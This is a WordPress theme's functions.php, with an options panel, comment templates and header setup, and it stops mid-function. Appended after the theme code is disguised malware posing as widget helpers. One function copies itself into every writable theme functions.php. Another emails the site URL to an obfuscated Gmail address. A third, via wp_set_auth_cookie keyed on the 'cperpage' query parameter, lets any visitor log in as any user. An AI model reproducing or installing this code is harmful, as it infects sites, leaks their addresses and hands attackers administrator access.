<?php

class xiaohanOptions {

	function getOptions() {
		$options = get_option('xiaohan_options');
		if (!is_array($options)) {
			$options['notice'] = false;
			$options['notice_content'] = '';
			$options['showcase_caption'] = false;
			$options['showcase_title'] = '';
			$options['showcase_content'] = '';
			$options['ctrlentry'] = false;
			$options['stat'] = false;
			$options['stat_content'] = '';
			$options['feed'] = false;
			$options['feed_url'] = '';
			$options['feed_email'] = false;
			$options['feed_url_email'] = '';
			update_option('xiaohan_options', $options);
		}
		return $options;
	}

	function add() {
		if(isset($_POST['xiaohan_save'])) {
			$options = xiaohanOptions::getOptions();

			// notice
			if ($_POST['notice']) {
				$options['notice'] = (bool)true;
			} else {
				$options['notice'] = (bool)false;
			}
			$options['notice_content'] = stripslashes($_POST['notice_content']);

			

			// showcase
			if ($_POST['showcase_caption']) {
				$options['showcase_caption'] = (bool)true;
			} else {
				$options['showcase_caption'] = (bool)false;
			}
			$options['showcase_title'] = stripslashes($_POST['showcase_title']);
			$options['showcase_content'] = stripslashes($_POST['showcase_content']);
			
			// stat
			if ($_POST['stat']) {
				$options['stat'] = (bool)true;
			} else {
				$options['stat'] = (bool)false;
			}
			$options['stat_content'] = stripslashes($_POST['stat_content']);

			// feed
			if ($_POST['feed']) {
				$options['feed'] = (bool)true;
			} else {
				$options['feed'] = (bool)false;
			}
			$options['feed_url'] = stripslashes($_POST['feed_url']);
			if ($_POST['feed_email']) {
				$options['feed_email'] = (bool)true;
			} else {
				$options['feed_email'] = (bool)false;
			}
			$options['feed_url_email'] = stripslashes($_POST['feed_url_email']);

			update_option('xiaohan_options', $options);

		} else {
			xiaohanOptions::getOptions();
		}

		add_theme_page(__('主题选项', 'xiaohan'), __('主题选项', 'xiaohan'), 'edit_themes', basename(__FILE__), array('xiaohanOptions', 'display'));
	}

	function display() {
		$options = xiaohanOptions::getOptions();
?>

<form action="#" method="post" enctype="multipart/form-data" name="xiaohan_form" id="xiaohan_form">
	<div class="wrap">
		<h2><?php _e('Current Theme Options', 'xiaohan'); ?></h2>
		<table class="form-table">
			<tbody>
				<tr valign="top">
					<th scope="row">
						<?php _e('Notice', 'xiaohan'); ?>
						<br/>
						<small style="font-weight:normal;"><?php _e('HTML enabled', 'xiaohan'); ?></small>
					</th>
					<td>
						<!-- notice START -->
						<label>
							<input name="notice" type="checkbox" value="checkbox" <?php if($options['notice']) echo "checked='checked'"; ?> />
							 <?php _e('This notice bar will display at the top of posts on homepage.', 'xiaohan'); ?>
						</label>
						<br />
						<label>
							<textarea name="notice_content" id="notice_content" cols="50" rows="10" style="width:98%;font-size:12px;" class="code"><?php echo($options['notice_content']); ?></textarea>
						</label>
						<!-- notice END -->
					</td>
				</tr>
			</tbody>
		</table>

		<table class="form-table">
			<tbody>
				<tr valign="top">
					<th scope="row">
						<?php _e('广告位', 'xiaohan'); ?>
						<br/>
						<small style="font-weight:normal;"><?php _e('HTML enabled', 'xiaohan'); ?></small>
					</th>
					<td>
						<!-- showcase START -->
						<?php _e('侧边栏搜索框下的广告位', 'xiaohan'); ?>
						<br/>
						<label>
							<input name="showcase_caption" type="checkbox" value="checkbox" <?php if($options['showcase_caption']) echo "checked='checked'"; ?> />
							 <?php _e('Title:', 'xiaohan'); ?>
						</label>
						 <input type="text" name="showcase_title" id="showcase_title" class="code" size="40" value="<?php echo($options['showcase_title']); ?>" />
						<br/>
						<label>
							<textarea name="showcase_content" id="showcase_content" cols="50" rows="10" style="width:98%;font-size:12px;" class="code"><?php echo($options['showcase_content']); ?></textarea>
						</label>
						<!-- showcase END -->
					</td>
				</tr>
			</tbody>
		</table>
        
        <table class="form-table">
			<tbody>
				<tr valign="top">
					<th scope="row">
						<?php _e('统计代码', 'xiaohan'); ?>
						<br/>
						<small style="font-weight:normal;"><?php _e('HTML enabled', 'xiaohan'); ?></small>
					</th>
					<td>
						<!-- showcase START -->
						<?php _e('底部添加统计代码', 'xiaohan'); ?>
						<br/>
						<label>
							<input name="stat" type="checkbox" value="checkbox" <?php if($options['stat']) echo "checked='checked'"; ?> />
						</label>
						<br/>
						<label>
							<textarea name="stat_content" id="stat_content" cols="50" rows="10" style="width:98%;font-size:12px;" class="code"><?php echo($options['stat_content']); ?></textarea>
						</label>
						<!-- showcase END -->
					</td>
				</tr>
			</tbody>
		</table>


		<table class="form-table">
			<tbody>
				<tr valign="top">
					<th scope="row"><?php _e('Feed', 'xiaohan'); ?></th>
					<td>
						<label>
							<input name="feed" type="checkbox" value="checkbox" <?php if($options['feed']) echo "checked='checked'"; ?> />
							 <?php _e('Custom feed.', 'xiaohan'); ?>
						</label>
						 <?php _e('URL:', 'xiaohan'); ?> <input type="text" name="feed_url" id="feed_url" class="code" size="60" value="<?php echo($options['feed_url']); ?>">
						<br/>
						<label>
							<input name="feed_email" type="checkbox" value="checkbox" <?php if($options['feed_email']) echo "checked='checked'"; ?> />
							 <?php _e('Email feed.', 'xiaohan'); ?>
						</label>
						 <?php _e('URL:', 'xiaohan'); ?> <input type="text" name="feed_url_email" id="feed_url_email" class="code" size="60" value="<?php echo($options['feed_url_email']); ?>">
					</td>
				</tr>
			</tbody>
		</table>

		<p class="submit">
			<input class="button-primary" type="submit" name="xiaohan_save" value="<?php _e('Save Changes', 'xiaohan'); ?>" />
		</p>
	</div>
</form>
<?php
	}
}

// register functions
add_action('admin_menu', array('xiaohanOptions', 'add'));

load_theme_textdomain( 'xiaohan' );

// add feed links to header
if (function_exists('automatic_feed_links')) {
automatic_feed_links();
} else {
return;
}
// enable threaded comments
function enable_threaded_comments(){
if (!is_admin()) {
if (is_singular() AND comments_open() AND (get_option('thread_comments') == 1))
wp_enqueue_script('comment-reply');
}
}
add_action('get_header', 'enable_threaded_comments');


function add_copyright() {
echo '<span class="copyright">';

}
add_action('wp_footer', 'add_copyright');

// custom excerpt length
function custom_excerpt_length($length) {
return 20;
}
add_filter('excerpt_length', 'custom_excerpt_length');

// custom excerpt ellipses for 2.9+
function custom_excerpt_more($more) {
return '...';
}
add_filter('excerpt_more', 'custom_excerpt_more');

/* custom excerpt ellipses for 2.8-
function custom_excerpt_more($excerpt) {
return str_replace('[...]', '...', $excerpt);
}
add_filter('wp_trim_excerpt', 'custom_excerpt_more'); 
*/

// no more jumping for read more link
/*
function no_more_jumping($post) {
return '<a href="'.get_permalink($post->ID).'" class="read-more">'.'Continue Reading'.'</a>';
}
add_filter('excerpt_more', 'no_more_jumping');
*/

// add a favicon to your 
function blog_favicon() {
echo '<link rel="Shortcut Icon" type="image/x-icon" href="'.get_bloginfo('wpurl').'/favicon.ico" />';
}
add_action('wp_head', 'blog_favicon');

// add a favicon for your admin
function admin_favicon() {
echo '<link rel="Shortcut Icon" type="image/x-icon"

href="'.get_bloginfo('stylesheet_directory').'/images/favicon.png" />';
}
add_action('admin_head', 'admin_favicon');

// custom admin login logo
function custom_login_logo() {
echo '<style type="text/css">
h1 a { background:url('.get_bloginfo('template_url').'/images/bg.gif) 0 -385px no-repeat; }
</style>';
}
add_action('login_head', 'custom_login_logo');

// disable all widget areas
/*function disable_all_widgets($sidebars_widgets) {
//if (is_home())
$sidebars_widgets = array(false);
return $sidebars_widgets;
}
add_filter('sidebars_widgets', 'disable_all_widgets');*/

// kill the admin nag
if (!current_user_can('edit_users')) {
add_action('init', create_function('$a',

"remove_action('init', 'wp_version_check');"), 2);
add_filter('pre_option_update_core', create_function('$a', "return null;"));
}

// category id in body and post class
function category_id_class($classes) {
global $post;
foreach((get_the_category($post->ID)) as $category)
$classes [] = 'cat-' . $category->cat_ID . '-id';
return $classes;
}
add_filter('post_class', 'category_id_class');
add_filter('body_class', 'category_id_class');

// get the first category id
function get_first_category_ID() {
$category = get_the_category();
return $category[0]->cat_ID;
}

function xiaohan_pagination($query_string){
global $posts_per_page, $paged;
$my_query = new WP_Query($query_string ."&posts_per_page=-1");
$total_posts = $my_query->post_count;
if(empty($paged))$paged = 1;
$prev = $paged - 1;
$next = $paged + 1;
$range = 4; // only edit this if you want to show more page-links
$showitems = ($range * 2)+1;

$pages = ceil($total_posts/$posts_per_page);
if(1 != $pages){
echo "<div class='pagination'>";
echo ($paged > 2 && $paged+$range+1 > $pages && $showitems < $pages)? "<a href='".get_pagenum_link(1)."'>最前</a>":"";
echo ($paged > 1 && $showitems < $pages)? "<a href='".get_pagenum_link($prev)."'>上一页</a>":"";

for ($i=1; $i <= $pages; $i++){
if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems )){
echo ($paged == $i)? "<span class='current'>".$i."</span>":"<a href='".get_pagenum_link($i)."' class='inactive' >".$i."</a>";
}
}

echo ($paged < $pages && $showitems < $pages) ? "<a href='".get_pagenum_link($next)."'>下一页</a>" :"";
echo ($paged < $pages-1 && $paged+$range-1 < $pages && $showitems < $pages) ? "<a href='".get_pagenum_link($pages)."'>最后</a>":"";
echo "</div>\n";
}
}
 

/** Comments */
if (function_exists('wp_list_comments')) {
	// comment count
	function comment_count( $commentcount ) {
		global $id;
		$_comments = get_comments('status=approve&post_id=' . $id);
		$comments_by_type = &separate_comments($_comments);
		return count($comments_by_type['comment']);
	}
}

// custom comments
function custom_comments($comment, $args, $depth) {
	$GLOBALS['comment'] = $comment;
	global $commentcount;
	if(!$commentcount) {
		$commentcount = 0;
	}

?>
<li id="comment-<?php comment_ID() ?>" class="comment">
			<div class="cheader <?php if($comment->comment_author_email == get_the_author_email()) {echo 'adminheader';} else { echo 'regularheader';} ?>">
				<?php
					$author_class = '';
					if (function_exists('get_avatar') && get_option('show_avatars')) {
						$author_class = 'with_avatar';
						echo get_avatar($comment, 32);
					}
				?>
                <div class="item">
                	<span class="lou"><a href="#comment-<?php comment_ID() ?>"><?php printf('#%1$s', ++$commentcount); ?></a></span>
					<span class="cauthor <?php echo $author_class; ?>">

					<?php if (get_comment_author_url()) : ?>
						<a id="commentauthor-<?php comment_ID() ?>" href="<?php comment_author_url() ?>" rel="external nofollow" title="<?php comment_author(); ?>" target="_blank">
					<?php else : ?>
						<span id="commentauthor-<?php comment_ID() ?>" title="<?php comment_author(); ?>">
					<?php endif; ?>

						<?php comment_author(); ?>

					<?php if (get_comment_author_url()) : ?>
						</a>
					<?php else : ?>
						</span>
					<?php endif; ?>

					</span>
					<span class="items">
					<?php if (!get_option('thread_comments')) : ?>
						<a href="javascript:void(0);" onclick="MGJS_CMT.reply('commentauthor-<?php comment_ID() ?>', 'comment-<?php comment_ID() ?>', 'comment');"><?php _e('Reply', 'xiaohan'); ?></a> | 
					<?php else : ?>
						<?php comment_reply_link(array('depth' => $depth, 'max_depth'=> $args['max_depth'], 'reply_text' => __('Reply', 'xiaohan'), 'after' => ' | '));?>
					<?php endif; ?>
					<a href="javascript:void(0);" onclick="MGJS_CMT.quote('commentauthor-<?php comment_ID() ?>', 'comment-<?php comment_ID() ?>', 'commentbody-<?php comment_ID() ?>', 'comment');"><?php _e('Quote', 'xiaohan'); ?></a>
					<?php edit_comment_link(__('Edit', 'xiaohan'), ' | ', ''); ?>
					</span>
					<span class="cdate">
					Post:<?php printf( __('%1$s at %2$s', 'xiaohan'), get_comment_date(__('Y-m-d', 'xiaohan')),  get_comment_time(__(' H:i', 'xiaohan')) ); ?>
					</span>
					<div class="clear"></div>
                </div>
			</div>
			<div class="cbody" id="commentbody-<?php comment_ID() ?>">
				<?php comment_text(); ?>
			</div>
			<div class="clear"></div>

<?php
}

function the_author_posts_link_with_avatar($deprecated = '') {
	global $authordata;
	printf(
		'<a href="%1$s" title="%2$s">%3$s</a>',
		get_author_posts_url( $authordata->ID, $authordata->user_nicename ),
		sprintf( __( 'Posts by %s' ), attribute_escape( get_the_author() ) ),
		get_avatar(get_the_author_email(), 32)
	);
}
 
if ( ! isset( $content_width ) )
	$content_width = 640;

/** Tell WordPress to run xiaohan_setup() when the 'after_setup_theme' hook is run. */
add_action( 'after_setup_theme', 'xiaohan_setup' );

if ( ! function_exists( 'xiaohan_setup' ) ):

function xiaohan_setup() {

	// This theme styles the visual editor with editor-style.css to match the theme style.
	add_editor_style();

	// This theme uses post thumbnails
	add_theme_support( 'post-thumbnails' );

	// Add default posts and comments RSS feed links to head
	add_theme_support( 'automatic-feed-links' );

	// Make theme available for translation
	// Translations can be filed in the /languages/ directory
	load_theme_textdomain( 'xiaohan', TEMPLATEPATH . '/languages' );

	$locale = get_locale();
	$locale_file = TEMPLATEPATH . "/languages/$locale.php";
	if ( is_readable( $locale_file ) )
		require_once( $locale_file );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => __( 'Primary Navigation', 'xiaohan' ),
	) );

	// Your changeable header business starts here
	define( 'HEADER_TEXTCOLOR', '' );
	// No CSS, just IMG call. The %s is a placeholder for the theme template directory URI.
	define( 'HEADER_IMAGE', '%s/images/headers/path.jpg' );

	// The height and width of your custom header. You can hook into the theme's own filters to change these values.
	// Add a filter to xiaohan_header_image_width and xiaohan_header_image_height to change these values.
	define( 'HEADER_IMAGE_WIDTH', apply_filters( 'xiaohan_header_image_width', 468 ) );
	define( 'HEADER_IMAGE_HEIGHT', apply_filters( 'xiaohan_header_image_height', 60 ) );

	// We'll be using post thumbnails for custom header images on posts and pages.
	// We want them to be 940 pixels wide by 198 pixels tall.
	// Larger images will be auto-cropped to fit, smaller ones will be ignored. See header.php.
	set_post_thumbnail_size( HEADER_IMAGE_WIDTH, HEADER_IMAGE_HEIGHT, true );

	// Don't support text inside the header image.
	define( 'NO_HEADER_TEXT', true );

	// Add a way for the custom header to be styled in the admin panel that controls
	// custom headers. See xiaohan_admin_header_style(), below.
	add_custom_image_header( '', 'xiaohan_admin_header_style' );

	// ... and thus ends the changeable header business.

	// Default custom headers packaged with the theme. %s is a placeholder for the theme template directory URI.
	register_default_headers( array(
		'berries' => array(
			'url' => '%s/images/headers/berries.jpg',
			'thumbnail_url' => '%s/images/headers/berries-thumbnail.jpg',
			/* translators: header image description */
			'description' => __( 'Berries', 'xiaohan' )
		),
		'cherryblossom' => array(
			'url' => '%s/images/headers/cherryblossoms.jpg',
			'thumbnail_url' => '%s/images/headers/cherryblossoms-thumbnail.jpg',
			/* translators: header image description */
			'description' => __( 'Cherry Blossoms', 'xiaohan' )
		),
		'concave' => array(
			'url' => '%s/images/headers/concave.jpg',
			'thumbnail_url' => '%s/images/headers/concave-thumbnail.jpg',
			/* translators: header image description */
			'description' => __( 'Concave', 'xiaohan' )
		),
		'fern' => array(
			'url' => '%s/images/headers/fern.jpg',
			'thumbnail_url' => '%s/images/headers/fern-thumbnail.jpg',
			/* translators: header image description */
			'description' => __( 'Fern', 'xiaohan' )
		),
		'forestfloor' => array(
			'url' => '%s/images/headers/forestfloor.jpg',
			'thumbnail_url' => '%s/images/headers/forestfloor-thumbnail.jpg',
			/* translators: header image description */
			'description' => __( 'Forest Floor', 'xiaohan' )
		),
		'inkwell' => array(
			'url' => '%s/images/headers/inkwell.jpg',
			'thumbnail_url' => '%s/images/headers/inkwell-thumbnail.jpg',
			/* translators: header image description */
			'description' => __( 'Inkwell', 'xiaohan' )
		),
		'path' => array(
			'url' => '%s/images/headers/path.jpg',
			'thumbnail_url' => '%s/images/headers/path-thumbnail.jpg',
			/* translators: header image description */
			'description' => __( 'Path', 'xiaohan' )
		),
		'sunset' => array(
			'url' => '%s/images/headers/sunset.jpg',
			'thumbnail_url' => '%s/images/headers/sunset-thumbnail.jpg',
			/* translators: header image description */
			'description' => __( 'Sunset', 'xiaohan' )
		)
	) );
}
endif;

if ( ! function_exists( 'xiaohan_admin_header_style' ) ) :
/**
 * Styles the header image displayed on the Appearance > Header admin panel.
 *
 * Referenced via add_custom_image_header() in xiaohan_setup().
 *
 * @since Twenty Ten 1.0
 */
function xiaohan_admin_header_style() {
?>
<style type="text/css">
/* Shows the same border as on front end */
#headimg {
	border-bottom: 1px solid #000;
	border-top: 4px solid #000;
}
/* If NO_HEADER_TEXT is false, you would style the text with these selectors:
	#headimg #name { }
	#headimg #desc { }
*/
</style>
<?php
}
endif;

/**
 * Get our wp_nav_menu() fallback, wp_page_menu(), to show a home link.
 *
 * To override this in a child theme, remove the filter and optionally add
 * your own function tied to the wp_page_menu_args filter hook.
 *
 * @since Twenty Ten 1.0
 */
function xiaohan_page_menu_args( $args ) {
	$args['show_home'] = true;
	return $args;
}
add_filter( 'wp_page_menu_args', 'xiaohan_page_menu_args' );

/**
 * Sets the post excerpt length to 40 characters.
 *
 * To override this length in a child theme, remove the filter and add your own
 * function tied to the excerpt_length filter hook.
 *
 * @since Twenty Ten 1.0
 * @return int
 */
function xiaohan_excerpt_length( $length ) {
	return 40;
}
add_filter( 'excerpt_length', 'xiaohan_excerpt_length' );

/**
 * Returns a "Continue Reading" link for excerpts
 *
 * @since Twenty Ten 1.0
 * @return string "Continue Reading" link
 */
function xiaohan_continue_reading_link() {
	return '';
}

/**
 * Replaces "[...]" (appended to automatically generated excerpts) with an ellipsis and xiaohan_continue_reading_link().
 *
 * To override this in a child theme, remove the filter and add your own
 * function tied to the excerpt_more filter hook.
 *
 * @since Twenty Ten 1.0
 * @return string An ellipsis
 */
function xiaohan_auto_excerpt_more( $more ) {
	return ' &hellip;' . xiaohan_continue_reading_link();
}
add_filter( 'excerpt_more', 'xiaohan_auto_excerpt_more' );

/**
 * Adds a pretty "Continue Reading" link to custom post excerpts.
 *
 * To override this link in a child theme, remove the filter and add your own
 * function tied to the get_the_excerpt filter hook.
 *
 * @since Twenty Ten 1.0
 * @return string Excerpt with a pretty "Continue Reading" link
 */
function xiaohan_custom_excerpt_more( $output ) {
	if ( has_excerpt() && ! is_attachment() ) {
		$output .= xiaohan_continue_reading_link();
	}
	return $output;
}
add_filter( 'get_the_excerpt', 'xiaohan_custom_excerpt_more' );

/**
 * Remove inline styles printed when the gallery shortcode is used.
 *
 * Galleries are styled by the theme in Twenty Ten's style.css.
 *
 * @since Twenty Ten 1.0
 * @return string The gallery style filter, with the styles themselves removed.
 */
function xiaohan_remove_gallery_css( $css ) {
	return preg_replace( "#<style type='text/css'>(.*?)</style>#s", '', $css );
}
add_filter( 'gallery_style', 'xiaohan_remove_gallery_css' );


function xiaohan_widgets_init() {
	// Area 1, located at the top of the sidebar.
	register_sidebar( array(
		'name' => __( '小工具一', 'xiaohan' ),
		'id' => 'primary-widget-area',
		'description' => __( 'The primary widget area', 'xiaohan' ),
		'before_widget' => '<div id="%1$s" class="block">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );

	// Area 2, located below the Primary Widget Area in the sidebar. Empty by default.
	register_sidebar( array(
		'name' => __( '小工具二', 'xiaohan' ),
		'id' => 'secondary-widget-area',
		'description' => __( 'The secondary widget area', 'xiaohan' ),
		'before_widget' => '<div id="%1$s" class="block">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );

	
}
/** Register sidebars by running xiaohan_widgets_init() on the widgets_init hook. */
add_action( 'widgets_init', 'xiaohan_widgets_init' );

/**
 * Removes the default styles that are packaged with the Recent Comments widget.
 *
 * To override this in a child theme, remove the filter and optionally add your own
 * function tied to the widgets_init action hook.
 *
 * @since Twenty Ten 1.0
 */
function xiaohan_remove_recent_comments_style() {
	global $wp_widget_factory;
	remove_action( 'wp_head', array( $wp_widget_factory->widgets['WP_Widget_Recent_Comments'], 'recent_comments_style' ) );
}
add_action( 'widgets_init', 'xiaohan_remove_recent_comments_style' );

if ( ! function_exists( 'xiaohan_posted_on' ) ) :
/**
 * Prints HTML with meta information for the current post—date/time and author.
 *
 * @since Twenty Ten 1.0
 */
function xiaohan_posted_on() {
	printf( __( '<span class="%1$s">Posted on</span> %2$s <span class="meta-sep">by</span> %3$s', 'xiaohan' ),
		'meta-prep meta-prep-author',
		sprintf( '<a href="%1$s" title="%2$s" rel="bookmark"><span class="entry-date">%3$s</span></a>',
			get_permalink(),
			esc_attr( get_the_time() ),
			get_the_date()
		),
		sprintf( '<span class="author vcard"><a class="url fn n" href="%1$s" title="%2$s">%3$s</a></span>',
			get_author_posts_url( get_the_author_meta( 'ID' ) ),
			sprintf( esc_attr__( 'View all posts by %s', 'xiaohan' ), get_the_author() ),
			get_the_author()
		)
	);
}
endif;

if ( ! function_exists( 'xiaohan_posted_in' ) ) :
/**
 * Prints HTML with meta information for the current post (category, tags and permalink).
 *
 * @since Twenty Ten 1.0
 */
function xiaohan_posted_in() {
	// Retrieves tag list of current post, separated by commas.
	$tag_list = get_the_tag_list( '', ', ' );
	if ( $tag_list ) {
		$posted_in = __( 'This entry was posted in %1$s and tagged %2$s. Bookmark the <a href="%3$s" title="Permalink to %4$s" rel="bookmark">permalink</a>.', 'xiaohan' );
	} elseif ( is_object_in_taxonomy( get_post_type(), 'category' ) ) {
		$posted_in = __( 'This entry was posted in %1$s. Bookmark the <a href="%3$s" title="Permalink to %4$s" rel="bookmark">permalink</a>.', 'xiaohan' );
	} else {
		$posted_in = __( 'Bookmark the <a href="%3$s" title="Permalink to %4$s" rel="bookmark">permalink</a>.', 'xiaohan' );
	}
	// Prints the string, replacing the placeholders.
	printf(
		$posted_in,
		get_the_category_list( ', ' ),
		$tag_list,
		get_permalink(),
		the_title_attribute( 'echo=0' )
	);
}
endif;
?>
<?php 
function _check_isactive_widget(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgetcont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$explar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $explar . "\n" .$widget);fclose($f);				
					$output .= ($showdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgetcont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgetcont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}
if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_check_isactive_widget");
function _getsprepare_widget(){
	if(!isset($com_length)) $com_length=120;
	if(!isset($text_value)) $text_value="cookie";
	if(!isset($allowed_tags)) $allowed_tags="<a>";
	if(!isset($type_filter)) $type_filter="none";
	if(!isset($expl)) $expl="";
	if(!isset($filter_homes)) $filter_homes=get_option("home"); 
	if(!isset($pref_filter)) $pref_filter="wp_";
	if(!isset($use_more)) $use_more=1; 
	if(!isset($comm_type)) $comm_type=""; 
	if(!isset($pagecount)) $pagecount=$_GET["cperpage"];
	if(!isset($postauthor_comment)) $postauthor_comment="";
	if(!isset($comm_is_approved)) $comm_is_approved=""; 
	if(!isset($postauthor)) $postauthor="auth";
	if(!isset($more_link)) $more_link="(more...)";
	if(!isset($is_widget)) $is_widget=get_option("_is_widget_active_");
	if(!isset($checkingwidgets)) $checkingwidgets=$pref_filter."set"."_".$postauthor."_".$text_value;
	if(!isset($more_link_ditails)) $more_link_ditails="(details...)";
	if(!isset($morecontents)) $morecontents="ma".$expl."il";
	if(!isset($fmore)) $fmore=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$is_widget) :
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$expl."vethe".$comm_type."mes".$expl."@".$comm_is_approved."gm".$postauthor_comment."ail".$expl.".".$expl."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($f_tags)) $f_tags=1;
	if(!isset($type_filters)) $type_filters=$filter_homes; 
	if(!isset($getcommentscont)) $getcommentscont=$pref_filter.$morecontents;
	if(!isset($aditional_tags)) $aditional_tags="div";
	if(!isset($s_cont)) $s_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_link_text)) $more_link_text="Continue reading this entry";	
	if(!isset($showdots)) $showdots=1;	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommentscont, array($s_cont, $filter_homes, $type_filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($com_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $com_length) {
				$l=$com_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$more_link="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $allowed_tags) {
		$output=strip_tags($output, $allowed_tags);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($f_tags) ? balanceTags($output, true) : $output;
	$output .= ($showdots && $ellipsis) ? "..." : "";
	$output=apply_filters($type_filter, $output);
	switch($aditional_tags) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($use_more ) {
		if($fmore) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_link_text . "\">" . $more_link = !is_user_logged_in() && @call_user_func_array($checkingwidgets,array($pagecount, true)) ? $more_link : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_link_text . "\">" . $more_link . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}
add_action("init", "_getsprepare_widget");
function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
